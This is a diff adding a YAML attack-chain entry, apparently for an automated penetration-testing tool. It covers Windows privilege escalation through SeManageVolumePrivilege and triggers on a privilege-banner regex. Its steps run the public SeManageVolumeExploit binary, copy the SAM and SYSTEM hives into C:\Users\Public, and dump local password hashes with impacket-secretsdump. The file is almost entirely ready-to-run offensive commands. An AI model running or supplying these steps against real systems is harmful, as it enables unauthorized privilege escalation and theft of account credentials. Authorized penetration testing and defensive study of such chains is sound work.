@@ -1,0 +1,33 @@
+chain_id: semanagevolume_raw_disk
+title: "Windows privesc — SeManageVolumePrivilege to read raw NTFS"
+severity: HIGH
+tags: [windows, privesc, semanagevolume, raw-disk]
+
+trigger:
+  any_of:
+    - { kind: "windows-privilege", banner_pattern: "(?i)SeManageVolumePrivilege" }
+
+description: |
+  SeManageVolumePrivilege grants raw access to the volume — bypassing
+  every NTFS DACL. Public exploitation drops a tiny C# stub that opens
+  the volume and reads SAM, SYSTEM, NTDS.dit, or any other locked file.
+
+steps:
+  - id: 1
+    title: "Drop the SeManageVolumeExploit binary"
+    command: |
+      # Build / fetch from https://github.com/CsEnox/SeManageVolumeExploit
+      .\\SeManageVolumeExploit.exe
+
+  - id: 2
+    title: "After the exploit grants Full Control on C:\\, copy the locked files"
+    command: |
+      copy C:\Windows\System32\config\SAM    C:\Users\Public\sam.copy
+      copy C:\Windows\System32\config\SYSTEM C:\Users\Public\system.copy
+
+  - id: 3
+    title: "Run secretsdump LOCAL on the copies"
+    command: impacket-secretsdump -sam sam.copy -system system.copy LOCAL
+
+references:
+  - https://github.com/CsEnox/SeManageVolumeExploit
